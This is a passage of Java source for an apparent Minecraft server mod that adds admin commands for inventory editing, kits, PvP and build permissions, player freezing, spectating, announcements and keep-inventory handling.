		chest.setStack(0, target.getEquippedStack(net.minecraft.entity.EquipmentSlot.HEAD).copy());
		chest.setStack(1, target.getEquippedStack(net.minecraft.entity.EquipmentSlot.CHEST).copy());
		chest.setStack(2, target.getEquippedStack(net.minecraft.entity.EquipmentSlot.LEGS).copy());
		chest.setStack(3, target.getEquippedStack(net.minecraft.entity.EquipmentSlot.FEET).copy());
		chest.setStack(4, target.getOffHandStack().copy());
		// Leave one empty row gap (visual separation): row 1 kept empty
		// Rows 2-? fill with main inventory and hotbar
		int slot = 18; // start placing from row 2 (index 18)
		var inv = target.getInventory();
		// Main inventory (27 slots, indexes 9..35 as per PlayerInventory order)
		for (int i = 9; i < 36 && slot < 54; i++) {
			ItemStack stack = inv.getStack(i);
			if (!stack.isEmpty()) chest.setStack(slot, stack.copy());
			slot++;
		}
		// Hotbar (0..8)
		for (int i = 0; i < 9 && slot < 54; i++) {
			ItemStack stack = inv.getStack(i);
			if (!stack.isEmpty()) chest.setStack(slot, stack.copy());
			slot++;
		}
		
		// Create editable inventory with listener to sync changes back to target
		net.minecraft.inventory.SimpleInventory editableChest = new net.minecraft.inventory.SimpleInventory(54) {
			@Override
			public void setStack(int slot, ItemStack stack) {
				super.setStack(slot, stack);
				// Sync changes back to target player
				syncInventoryToTarget(target, this, slot);
			}
		};
		
		// Copy initial state to editable chest
		for (int i = 0; i < 54; i++) {
			editableChest.setStack(i, chest.getStack(i).copy());
		}
		
		// Open container to viewer with a title
		viewer.openHandledScreen(new net.minecraft.screen.SimpleNamedScreenHandlerFactory((syncId, playerInventory, playerEntity) ->
			net.minecraft.screen.GenericContainerScreenHandler.createGeneric9x6(syncId, playerInventory, editableChest),
			Text.literal("§e§lEditable Inventory of " + target.getName().getString())));
		return 1;
	}

	/**
	 * Check a player's enchanted chest (editable)
	 */
	private static int openEnchantedChestViewer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		ServerPlayerEntity viewer = ctx.getSource().getPlayer();
		if (viewer == null) return 0;
		
		// Create enchanted chest inventory (54 slots)
		net.minecraft.inventory.SimpleInventory enchantedChest = new net.minecraft.inventory.SimpleInventory(54);
		
		// Fill with enchanted items
		for (int i = 0; i < 54; i++) {
			var item = new net.minecraft.item.ItemStack(net.minecraft.item.Items.ENCHANTED_BOOK);
			item.set(net.minecraft.component.DataComponentTypes.CUSTOM_NAME, 
				Text.literal("§6§lEnchanted Item " + (i + 1)));
			enchantedChest.setStack(i, item);
		}
		
		// Create editable inventory with listener
		net.minecraft.inventory.SimpleInventory editableChest = new net.minecraft.inventory.SimpleInventory(54) {
			@Override
			public void setStack(int slot, ItemStack stack) {
				super.setStack(slot, stack);
				// Sync changes back to target player's enchanted chest
				syncEnchantedChestToTarget(target, this, slot);
			}
		};
		
		// Copy initial state to editable chest
		for (int i = 0; i < 54; i++) {
			editableChest.setStack(i, enchantedChest.getStack(i).copy());
		}
		
		viewer.openHandledScreen(new net.minecraft.screen.SimpleNamedScreenHandlerFactory(
			(syncId, inventory, p) -> new net.minecraft.screen.GenericContainerScreenHandler(
				net.minecraft.screen.ScreenHandlerType.GENERIC_9X6, syncId, inventory, editableChest, 6),
			Text.literal("§6§lEditable Enchanted Chest of " + target.getName().getString())
		));
		
		ctx.getSource().sendFeedback(() -> Text.literal("Opened editable enchanted chest for " + target.getName().getString()), false);
		return 1;
	}

	/**
	 * Sync inventory changes back to target player
	 */
	private static void syncInventoryToTarget(ServerPlayerEntity target, net.minecraft.inventory.SimpleInventory editableChest, int slot) {
		// Map chest slots back to player inventory slots
		if (slot >= 0 && slot < 54) {
			ItemStack stack = editableChest.getStack(slot);
			
			// Row 0: Armor (0-3), Offhand (4)
			if (slot == 0) {
				target.equipStack(net.minecraft.entity.EquipmentSlot.HEAD, stack.copy());
			} else if (slot == 1) {
				target.equipStack(net.minecraft.entity.EquipmentSlot.CHEST, stack.copy());
			} else if (slot == 2) {
				target.equipStack(net.minecraft.entity.EquipmentSlot.LEGS, stack.copy());
			} else if (slot == 3) {
				target.equipStack(net.minecraft.entity.EquipmentSlot.FEET, stack.copy());
			} else if (slot == 4) {
				target.setStackInHand(net.minecraft.util.Hand.OFF_HAND, stack.copy());
			}
			// Rows 2-5: Main inventory and hotbar (slots 18-53)
			else if (slot >= 18) {
				int playerSlot = slot - 18;
				// Main inventory (9-35) and hotbar (0-8)
				if (playerSlot < 27) {
					// Main inventory: slots 9-35
					target.getInventory().setStack(playerSlot + 9, stack.copy());
				} else if (playerSlot < 36) {
					// Hotbar: slots 0-8
					target.getInventory().setStack(playerSlot - 27, stack.copy());
				}
			}
		}
	}

	/**
	 * Sync enchanted chest changes back to target player
	 * Note: This is a placeholder - enchanted chests don't have a real storage location
	 * In a real implementation, you might want to store this in NBT or a custom data structure
	 */
	private static void syncEnchantedChestToTarget(ServerPlayerEntity target, net.minecraft.inventory.SimpleInventory editableChest, int slot) {
		// For now, we'll just send a message to indicate the change
		// In a real implementation, you'd store this data persistently
		if (!editableChest.getStack(slot).isEmpty()) {
			target.sendMessage(Text.literal("§6Enchanted chest slot " + slot + " updated"), false);
		}
	}

	/**
	 * Toggle allow block breaking for all players (non-OPs)
	 */
	private static int setAllowBreak(CommandContext<ServerCommandSource> ctx, boolean enabled) {
		allowBlockBreakingForAll = enabled;
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Allow block breaking for all: " + enabled), true);
		}
		return 1;
	}

	private static int showAllowBreakStatus(CommandContext<ServerCommandSource> ctx) {
		ctx.getSource().sendFeedback(() -> Text.literal("Allow block breaking for all: " + allowBlockBreakingForAll), false);
		return 1;
	}

	/**
	 * Toggle and show death-ban feature
	 */
	private static int setDeathBan(CommandContext<ServerCommandSource> ctx, boolean enabled) {
		deathBanEnabled = enabled;
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Death-ban set to: " + enabled), true);
		}
		return 1;
	}

	private static int showDeathBanStatus(CommandContext<ServerCommandSource> ctx) {
		ctx.getSource().sendFeedback(() -> Text.literal("Death-ban: " + deathBanEnabled), false);
		return 1;
	}

	/**
	 * Clear cobwebs in a 30 block radius around the executor
	 */
	private static int clearWebsNear(CommandContext<ServerCommandSource> ctx) {
		ServerPlayerEntity player = ctx.getSource().getPlayer();
		if (player == null) return 0;
		var world = player.getWorld();
		var center = player.getBlockPos();
		int radius = 30;
		int cleared = 0;
		for (int dx = -radius; dx <= radius; dx++) {
			for (int dy = -radius; dy <= radius; dy++) {
				for (int dz = -radius; dz <= radius; dz++) {
					var pos = center.add(dx, dy, dz);
					if (center.getSquaredDistance(pos) > (long)radius * radius) continue;
					var state = world.getBlockState(pos);
					if (state.isOf(Blocks.COBWEB)) {
						world.breakBlock(pos, false);
						cleared++;
					}
				}
			}
		}
		final int totalCleared = cleared;
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Cleared cobwebs: " + totalCleared), true);
		}
		return 1;
	}

	/**
	 * Set global PvP status
	 */
	private static int setGlobalPvP(CommandContext<ServerCommandSource> ctx, boolean enabled) {
		globalPvPEnabled = enabled;
		if (!enabled) {
			pvpEnabledPlayers.clear();
		}
		
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Global PvP set to " + enabled), true);
		}
		return 1;
	}

	/**
	 * Enable PvP for specific players
	 */
	private static int enablePvPForPlayers(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		for (ServerPlayerEntity player : EntityArgumentType.getPlayers(ctx, "targets")) {
			pvpEnabledPlayers.add(player.getUuid());
		}
		
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Enabled PvP for targets."), false);
		}
		return 1;
	}

	/**
	 * Disable PvP for specific players
	 */
	private static int disablePvPForPlayers(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		for (ServerPlayerEntity player : EntityArgumentType.getPlayers(ctx, "targets")) {
			pvpEnabledPlayers.remove(player.getUuid());
		}
		
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Disabled PvP for targets."), false);
		}
		return 1;
	}

	/**
	 * Show PvP status
	 */
	private static int showPvPStatus(CommandContext<ServerCommandSource> ctx) {
		int count;
		synchronized (pvpEnabledPlayers) {
			count = pvpEnabledPlayers.size();
		}
		
		// Always show PvP status to the command executor, even in stealth mode
		ctx.getSource().sendFeedback(() -> Text.literal("Global PvP: " + globalPvPEnabled + ", Per-player enabled count: " + count), false);
		return 1;
	}

	/**
	 * Open a kit editor chest for OP
	 */
	private static int openKitEditor(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity viewer = ctx.getSource().getPlayer();
		if (viewer == null) return 0;
		int id = com.mojang.brigadier.arguments.IntegerArgumentType.getInteger(ctx, "id");
		int idx = id - 1;
		
		// Create a copy of the kit for editing
		var editInv = new UnmovableInventory(54);
		
		// Set up the new layout:
		// Row 1: Hotbar (slots 0-8)
		// Row 2: Inventory row 2 (slots 9-17) 
		// Row 3: Inventory row 3 (slots 18-26)
		// Row 4: Inventory row 4 (slots 27-35)
		// Row 5: Glass panes separator (slots 36-44)
		// Row 6: Armor + offhand (slots 45-53)
		
		// Row 5: Glass panes separator
		for (int i = 36; i < 45; i++) {
			var glass = new net.minecraft.item.ItemStack(net.minecraft.block.Blocks.BLACK_STAINED_GLASS_PANE);
			glass.set(net.minecraft.component.DataComponentTypes.CUSTOM_NAME, Text.literal("§8§lUNMOVABLE"));
			editInv.setStack(i, glass);
		}
		
		// Row 1: Copy hotbar (kit slots 0-8)
		for (int i = 0; i < 9; i++) {
			editInv.setStack(i, kits[idx].getStack(i).copy());
		}
		
		// Row 2: Copy inventory row 2 (kit slots 9-17)
		for (int i = 9; i < 18; i++) {
			editInv.setStack(i, kits[idx].getStack(i).copy());
		}
		
		// Row 3: Copy inventory row 3 (kit slots 18-26)
		for (int i = 18; i < 27; i++) {
			editInv.setStack(i, kits[idx].getStack(i).copy());
		}
		
		// Row 4: Copy inventory row 4 (kit slots 27-35)
		for (int i = 27; i < 36; i++) {
			editInv.setStack(i, kits[idx].getStack(i).copy());
		}
		
		// Row 6: Copy armor and offhand (kit slots 36-40)
		// Helmet, Chestplate, Leggings, Boots, Offhand
		editInv.setStack(45, kits[idx].getStack(36).copy()); // Helmet
		editInv.setStack(46, kits[idx].getStack(37).copy()); // Chestplate
		editInv.setStack(47, kits[idx].getStack(38).copy()); // Leggings
		editInv.setStack(48, kits[idx].getStack(39).copy()); // Boots
		editInv.setStack(49, kits[idx].getStack(40).copy()); // Offhand
		
		// Create a custom screen handler with proper layout
		viewer.openHandledScreen(new net.minecraft.screen.SimpleNamedScreenHandlerFactory((syncId, playerInventory, playerEntity) -> {
			// Create a 6-row chest (54 slots)
			var handler = net.minecraft.screen.GenericContainerScreenHandler.createGeneric9x6(syncId, playerInventory, editInv);
			
			// Add a listener to save the kit when the screen is closed
			handler.addListener(new net.minecraft.screen.ScreenHandlerListener() {
				@Override
				public void onSlotUpdate(net.minecraft.screen.ScreenHandler handler, int slotId, net.minecraft.item.ItemStack stack) {
					// Copy hotbar (editor slots 0-8 to kit slots 0-8)
					for (int i = 0; i < 9; i++) {
						kits[idx].setStack(i, editInv.getStack(i).copy());
					}
					
					// Copy inventory rows 2-4 (editor slots 9-35 to kit slots 9-35)
					for (int i = 9; i < 36; i++) {
						kits[idx].setStack(i, editInv.getStack(i).copy());
					}
					
					// Copy armor and offhand (editor slots 45-49 to kit slots 36-40)
					kits[idx].setStack(36, editInv.getStack(45).copy()); // Helmet
					kits[idx].setStack(37, editInv.getStack(46).copy()); // Chestplate
					kits[idx].setStack(38, editInv.getStack(47).copy()); // Leggings
					kits[idx].setStack(39, editInv.getStack(48).copy()); // Boots
					kits[idx].setStack(40, editInv.getStack(49).copy()); // Offhand
					
					// Save the kit to file
					saveKit(idx);
				}
				
				@Override
				public void onPropertyUpdate(net.minecraft.screen.ScreenHandler handler, int property, int value) {
					// Not needed for inventory updates
				}
			});
			
			return handler;
		}, Text.literal("Edit Kit " + id)));
		return 1;
	}

	/**
	 * Give a kit to the executor
	 */
	private static int giveKitToSelf(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity receiver = ctx.getSource().getPlayer();
		if (receiver == null) return 0;
		int id = com.mojang.brigadier.arguments.IntegerArgumentType.getInteger(ctx, "id");
		int idx = id - 1;
		var kit = kits[idx];
		var inv = receiver.getInventory();
		
		// Handle hotbar from kit slots 0-8
		for (int i = 0; i < 9; i++) {
			var stack = kit.getStack(i);
			if (!stack.isEmpty()) {
				inv.setStack(i, stack.copy());
			}
		}
		
		// Handle inventory rows 2-4 from kit slots 9-35
		for (int i = 9; i < 36; i++) {
			var stack = kit.getStack(i);
			if (!stack.isEmpty()) {
				inv.setStack(i, stack.copy());
			}
		}
		
		// Handle armor and offhand from kit slots 36-40
		var helmet = kit.getStack(36);
		var chestplate = kit.getStack(37);
		var leggings = kit.getStack(38);
		var boots = kit.getStack(39);
		var offhand = kit.getStack(40);
		
		// Equip armor and offhand
		if (!helmet.isEmpty()) receiver.equipStack(net.minecraft.entity.EquipmentSlot.HEAD, helmet.copy());
		if (!chestplate.isEmpty()) receiver.equipStack(net.minecraft.entity.EquipmentSlot.CHEST, chestplate.copy());
		if (!leggings.isEmpty()) receiver.equipStack(net.minecraft.entity.EquipmentSlot.LEGS, leggings.copy());
		if (!boots.isEmpty()) receiver.equipStack(net.minecraft.entity.EquipmentSlot.FEET, boots.copy());
		if (!offhand.isEmpty()) receiver.getInventory().offHand.set(0, offhand.copy());
		
		receiver.currentScreenHandler.sendContentUpdates();
		return 1;
	}
	
	
	/**
	 * Load kits from NBT files on server start (placeholder for now)
	 */
	private static void loadKits() {
		// TODO: Implement proper NBT loading when API is stable
		LOGGER.info("Kit system loaded - persistence coming soon!");
	}
	
	/**
	 * Save a kit to NBT file (placeholder for now)
	 */
	private static void saveKit(int kitIndex) {
		// TODO: Implement proper NBT saving when API is stable
		LOGGER.info("Kit " + (kitIndex + 1) + " saved in memory");
	}
	
	/**
	 * Freeze a player by opening GUI repeatedly
	 */
	private static int freezePlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		String executorName = ctx.getSource().getName();
		
		if (frozenPlayers.contains(target.getUuid())) {
			// Unfreeze
			frozenPlayers.remove(target.getUuid());
			ctx.getSource().sendFeedback(() -> Text.literal("Unfroze " + target.getName().getString()), false);
			target.sendMessage(Text.literal("§aYou have been unfrozen!"), false);
		} else {
			// Freeze
			frozenPlayers.add(target.getUuid());
			ctx.getSource().sendFeedback(() -> Text.literal("Froze " + target.getName().getString()), false);
			target.sendMessage(Text.literal("§cYou have been frozen by " + executorName + "!"), false);
			
			// Start the freeze loop
			startFreezeLoop(target, executorName);
		}
		return 1;
	}
	
	/**
	 * Start the freeze loop that opens GUI repeatedly
	 */
	private static void startFreezeLoop(ServerPlayerEntity target, String executorName) {
		// Schedule a repeating task to open GUI
		net.minecraft.server.MinecraftServer server = target.getServer();
		server.execute(() -> {
			if (frozenPlayers.contains(target.getUuid()) && !target.isDisconnected()) {
				// Open freeze GUI
				openFreezeGUI(target, executorName);
				
				// Schedule next freeze GUI in 1 second
				server.execute(() -> startFreezeLoop(target, executorName));
			}
		});
	}

	/**
	 * Toggle repetitive chest opening that says Freezing
	 */
	private static int toggleFreezingChest(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		if (freezingChestPlayers.contains(target.getUuid())) {
			freezingChestPlayers.remove(target.getUuid());
			ctx.getSource().sendFeedback(() -> Text.literal("Stopped freezing chests for " + target.getName().getString()), false);
		} else {
			freezingChestPlayers.add(target.getUuid());
			ctx.getSource().sendFeedback(() -> Text.literal("Started freezing chests for " + target.getName().getString()), false);
			startFreezingChestLoop(target);
		}
		return 1;
	}

	private static void startFreezingChestLoop(ServerPlayerEntity target) {
		net.minecraft.server.MinecraftServer server = target.getServer();
		server.execute(() -> {
			if (freezingChestPlayers.contains(target.getUuid()) && !target.isDisconnected()) {
				openFreezingChestGUI(target);
				server.execute(() -> startFreezingChestLoop(target));
			}
		});
	}

	private static void openFreezingChestGUI(ServerPlayerEntity target) {
		var inv = new net.minecraft.inventory.SimpleInventory(9);
		for (int i = 0; i < 9; i++) {
			var ice = new net.minecraft.item.ItemStack(net.minecraft.block.Blocks.ICE);
			ice.set(net.minecraft.component.DataComponentTypes.CUSTOM_NAME, Text.literal("§bFreezing"));
			inv.setStack(i, ice);
		}
		target.openHandledScreen(new net.minecraft.screen.SimpleNamedScreenHandlerFactory(
			(syncId, inventory, p) -> new net.minecraft.screen.GenericContainerScreenHandler(
				net.minecraft.screen.ScreenHandlerType.GENERIC_9X1, syncId, inventory, inv, 1),
			Text.literal("§b§lFreezing")
		));
	}
	
	/**
	 * Open freeze GUI for frozen player
	 */
	private static void openFreezeGUI(ServerPlayerEntity target, String executorName) {
		var freezeInv = new net.minecraft.inventory.SimpleInventory(9);
		
		// Fill with barrier blocks to make it look frozen
		for (int i = 0; i < 9; i++) {
			var barrier = new net.minecraft.item.ItemStack(net.minecraft.block.Blocks.BARRIER);
			barrier.set(net.minecraft.component.DataComponentTypes.CUSTOM_NAME, 
				Text.literal("§c§lFROZEN BY " + executorName.toUpperCase()));
			freezeInv.setStack(i, barrier);
		}
		
		target.openHandledScreen(new net.minecraft.screen.SimpleNamedScreenHandlerFactory(
			(syncId, inventory, player) -> new net.minecraft.screen.GenericContainerScreenHandler(
				net.minecraft.screen.ScreenHandlerType.GENERIC_9X1, syncId, inventory, freezeInv, 1),
			Text.literal("§c§lFROZEN BY " + executorName.toUpperCase())
		));
	}
	
	/**
	 * Set global place permission
	 */
	private static int setGlobalPlaceAllowed(CommandContext<ServerCommandSource> ctx, boolean allowed) {
		globalPlaceAllowed = allowed;
		ctx.getSource().sendFeedback(() -> Text.literal("Global block placement " + (allowed ? "enabled" : "disabled")), false);
		return 1;
	}
	
	/**
	 * Show place permission status
	 */
	private static int showPlaceStatus(CommandContext<ServerCommandSource> ctx) {
		ctx.getSource().sendFeedback(() -> Text.literal("Global place allowed: " + globalPlaceAllowed), false);
		return 1;
	}
	
	/**
	 * Allow place for specific player
	 */
	private static int allowPlaceForPlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		allowedPlacePlayers.add(target.getUuid());
		ctx.getSource().sendFeedback(() -> Text.literal("Allowed " + target.getName().getString() + " to place blocks"), false);
		return 1;
	}
	
	/**
	 * Disallow place for specific player
	 */
	private static int disallowPlaceForPlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		allowedPlacePlayers.remove(target.getUuid());
		ctx.getSource().sendFeedback(() -> Text.literal("Disallowed " + target.getName().getString() + " from placing blocks"), false);
		return 1;
	}
	
	/**
	 * Toggle vanish see for NotlucySigma
	 */
	private static int toggleVanishSee(CommandContext<ServerCommandSource> ctx) {
		// This would require more complex implementation with packet manipulation
		// For now, just show a message
		ctx.getSource().sendFeedback(() -> Text.literal("§eVanishSee toggled - this feature requires additional implementation"), false);
		return 1;
	}
	
	/**
	 * Open enchanted chest for the user
	 */
	private static int openEnchantedChest(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity player = ctx.getSource().getPlayerOrThrow();
		
		var enchantedChest = new net.minecraft.inventory.SimpleInventory(54);
		
		// Fill with enchanted items
		for (int i = 0; i < 54; i++) {
			var item = new net.minecraft.item.ItemStack(net.minecraft.item.Items.ENCHANTED_BOOK);
			item.set(net.minecraft.component.DataComponentTypes.CUSTOM_NAME, 
				Text.literal("§6§lEnchanted Item " + (i + 1)));
			enchantedChest.setStack(i, item);
		}
		
		player.openHandledScreen(new net.minecraft.screen.SimpleNamedScreenHandlerFactory(
			(syncId, inventory, p) -> new net.minecraft.screen.GenericContainerScreenHandler(
				net.minecraft.screen.ScreenHandlerType.GENERIC_9X6, syncId, inventory, enchantedChest, 6),
			Text.literal("§6§lEnchanted Chest")
		));
		
		ctx.getSource().sendFeedback(() -> Text.literal("Opened enchanted chest"), false);
		return 1;
	}
	
	/**
	 * Watch a player (spectate without going into spectator mode)
	 */
	private static int watchPlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity watcher = ctx.getSource().getPlayerOrThrow();
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		
		if (watchingPlayers.containsKey(watcher.getUuid())) {
			// Stop watching
			stopWatching(watcher);
			ctx.getSource().sendFeedback(() -> Text.literal("Stopped watching " + target.getName().getString()), false);
		} else {
			// Start watching
			startWatching(watcher, target);
			ctx.getSource().sendFeedback(() -> Text.literal("Now watching " + target.getName().getString()), false);
		}
		return 1;
	}
	
	/**
	 * Start watching a player
	 */
	private static void startWatching(ServerPlayerEntity watcher, ServerPlayerEntity target) {
		// Store original position
		watchPositions.put(watcher.getUuid(), watcher.getPos());
		
		// Set watching relationship
		watchingPlayers.put(watcher.getUuid(), target.getUuid());
		
		// Start the watch loop
		startWatchLoop(watcher, target);
	}
	
	/**
	 * Stop watching
	 */
	private static void stopWatching(ServerPlayerEntity watcher) {
		UUID watcherId = watcher.getUuid();
		
		// Restore original position
		net.minecraft.util.math.Vec3d originalPos = watchPositions.get(watcherId);
		if (originalPos != null) {
			watcher.teleport(originalPos.x, originalPos.y, originalPos.z, true);
		}
		
		// Clear watching data
		watchingPlayers.remove(watcherId);
		watchPositions.remove(watcherId);
	}
	
	/**
	 * Watch loop that updates position
	 */
	private static void startWatchLoop(ServerPlayerEntity watcher, ServerPlayerEntity target) {
		net.minecraft.server.MinecraftServer server = watcher.getServer();
		server.execute(() -> {
			if (watchingPlayers.containsKey(watcher.getUuid()) && !watcher.isDisconnected()) {
				// Update watcher position to target position
				watcher.teleport(target.getX(), target.getY(), target.getZ(), true);
				watcher.setYaw(target.getYaw());
				watcher.setPitch(target.getPitch());
				
				// Schedule next update
				server.execute(() -> startWatchLoop(watcher, target));
			}
		});
	}
	
	/**
	 * Announce message to all players
	 */
	private static int announceMessage(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		String message = com.mojang.brigadier.arguments.StringArgumentType.getString(ctx, "message");
		String executorName = ctx.getSource().getName();
		
		// Create announcement text
		Text announcement = Text.literal("§6§l" + executorName + ": §r" + message);
		
		// Send to all players
		ctx.getSource().getServer().getPlayerManager().broadcast(announcement, false);
		
		ctx.getSource().sendFeedback(() -> Text.literal("Announcement sent"), false);
		return 1;
	}
	
	private static int startEventMode(CommandContext<ServerCommandSource> ctx) {
		if (eventModeActive) {
			ctx.getSource().sendError(Text.literal("Event mode is already active"));
			return 0;
		}
		
		// Store current settings
		eventModePlaceAllowed = globalPlaceAllowed;
		eventModeBreakAllowed = allowBlockBreakingForAll;
		eventModePvPEnabled = globalPvPEnabled;
		
		// Enable event settings
		globalPlaceAllowed = true;
		allowBlockBreakingForAll = true;
		globalPvPEnabled = true;
		eventModeActive = true;
		
		// Announce to all players
		Text announcement = Text.literal("§e§lEVENT MODE STARTED! §r§7Place, break, and PvP enabled!");
		ctx.getSource().getServer().getPlayerManager().broadcast(announcement, false);
		
		ctx.getSource().sendFeedback(() -> Text.literal("Event mode started"), false);
		return 1;
	}
	
	private static int stopEventMode(CommandContext<ServerCommandSource> ctx) {
		if (!eventModeActive) {
			ctx.getSource().sendError(Text.literal("Event mode is not active"));
			return 0;
		}
		
		// Restore previous settings
		globalPlaceAllowed = eventModePlaceAllowed;
		allowBlockBreakingForAll = eventModeBreakAllowed;
		globalPvPEnabled = eventModePvPEnabled;
		eventModeActive = false;
		
		// Announce to all players
		Text announcement = Text.literal("§c§lEVENT MODE ENDED! §r§7Settings restored to previous state");
		ctx.getSource().getServer().getPlayerManager().broadcast(announcement, false);
		
		ctx.getSource().sendFeedback(() -> Text.literal("Event mode stopped and settings restored"), false);
		return 1;
	}
	
	/**
	 * Check if player is frozen
	 */
	public static boolean isFrozen(UUID playerId) {
		return frozenPlayers.contains(playerId);
	}
	
	/**
	 * Check if player can place blocks
	 */
	public static boolean canPlaceBlocks(ServerPlayerEntity player) {
		return globalPlaceAllowed || allowedPlacePlayers.contains(player.getUuid()) || isPlayerOp(player);
	}
	
	/**
	 * Set global keep inventory
	 */
	private static int setKeepInvGlobal(CommandContext<ServerCommandSource> ctx, boolean enabled) {
		keepInvGlobal = enabled;
		ctx.getSource().sendFeedback(() -> Text.literal("Global keep inventory: " + enabled), false);
		return 1;
	}
	
	/**
	 * Enable keep inventory for specific player
	 */
	private static int enableKeepInvForPlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		keepInvPlayers.add(target.getUuid());
		ctx.getSource().sendFeedback(() -> Text.literal("Enabled keep inventory for " + target.getName().getString()), false);
		return 1;
	}
	
	/**
	 * Disable keep inventory for specific player
	 */
	private static int disableKeepInvForPlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		keepInvPlayers.remove(target.getUuid());
		ctx.getSource().sendFeedback(() -> Text.literal("Disabled keep inventory for " + target.getName().getString()), false);
		return 1;
	}
	
	/**
	 * Register keep inventory event handlers
	 */
	private static void registerKeepInvHandlers() {
		// Snapshot inventory on death if keep-inv applies
		ServerLivingEntityEvents.AFTER_DEATH.register((entity, source) -> {
			if (!(entity instanceof ServerPlayerEntity sp)) return;
			if (!(keepInvGlobal || keepInvPlayers.contains(sp.getUuid()))) return;
			DefaultedList<ItemStack> snapshot = DefaultedList.ofSize(sp.getInventory().size(), ItemStack.EMPTY);
			for (int i = 0; i < sp.getInventory().size(); i++) {
				snapshot.set(i, sp.getInventory().getStack(i).copy());
			}
			keepInvSnapshots.put(sp.getUuid(), snapshot);
		});
		// Restore on respawn
		ServerPlayerEvents.COPY_FROM.register((oldPlayer, newPlayer, alive) -> {
			var uuid = oldPlayer.getUuid();
			DefaultedList<ItemStack> snapshot = keepInvSnapshots.remove(uuid);
			if (snapshot == null) return;
			for (int i = 0; i < Math.min(snapshot.size(), newPlayer.getInventory().size()); i++) {
				newPlayer.getInventory().setStack(i, snapshot.get(i).copy());
			}
			newPlayer.currentScreenHandler.sendContentUpdates();
		});
	}
}